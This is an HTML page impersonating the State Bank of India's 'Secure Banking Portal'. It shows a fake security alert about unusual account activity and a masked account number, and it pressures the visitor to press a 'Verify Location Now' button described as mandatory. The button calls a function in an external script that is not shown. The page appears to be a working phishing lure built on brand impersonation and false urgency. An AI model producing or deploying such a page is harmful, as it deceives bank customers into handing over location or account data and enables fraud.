<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SBI Secure - Account Verification</title>
  <style>
    body { margin:0; font-family:Arial,sans-serif; background:#f4f4f4; }
    .header { background:#003087; color:white; padding:15px; text-align:center; font-size:22px; }
    .container { max-width:500px; margin:40px auto; background:white; border:1px solid #ccc; border-radius:8px; box-shadow:0 4px 15px rgba(0,0,0,0.1); }
    .content { padding:30px; text-align:center; }
    button { background:#003087; color:white; border:none; padding:16px 40px; font-size:18px; border-radius:6px; cursor:pointer; width:100%; margin:20px 0; }
    .warning { color:#d32f2f; font-weight:bold; font-size:18px; }
  </style>
</head>
<body>
  <div class="header">
    <h2>STATE BANK OF INDIA</h2>
    <p>Secure Banking Portal</p>
  </div>
  <div class="container">
    <div class="content">
      <h1>⚠️ Security Alert</h1>
      <p class="warning">Unusual activity detected in your SBI Account</p>
      <p>We need to verify your current location to secure your account.</p>
      <p><strong>Account Ending: XXXX9876</strong></p>
      <button onclick="startBankVerification()">Verify Location Now</button>
      <p style="font-size:13px;color:#666;">This is a mandatory security step.</p>
    </div>
  </div>

  <script src="main.js"></script>
</body>
</html>
